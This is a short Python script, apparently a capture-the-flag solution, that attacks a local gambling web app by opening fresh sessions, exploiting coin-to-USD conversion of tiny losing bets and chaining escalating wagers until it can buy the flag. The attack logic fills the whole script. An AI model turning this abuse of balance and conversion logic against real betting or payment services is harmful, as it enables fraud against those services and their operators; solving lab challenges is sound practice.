import requests
import time

BASE_URL = "http://0.0.0.0:1337"

def gamble(curr, n):
    payload = {
        "currency": curr,
        "amount": n
    }
    return s.post(f"{BASE_URL}/api/gamble", json=payload).json()

def convert():
    return s.post(f"{BASE_URL}/api/convert", json={f"amount": 9}).json()

def buy_flag():
    return s.post(f"{BASE_URL}/api/flag").json()

def get_balance():
    return s.get(f"{BASE_URL}/api/balance").json()["usd"]

while True:
    s = requests.Session()
    if not gamble("coins", 0.0000091)['win']:
        convert()
        while get_balance() >= 0.01:
            if gamble("usd", 0.01)['win']:
                if gamble("usd", 0.1)['win']:
                    if gamble("usd", 1)['win']:
                        print(buy_flag())
                        exit()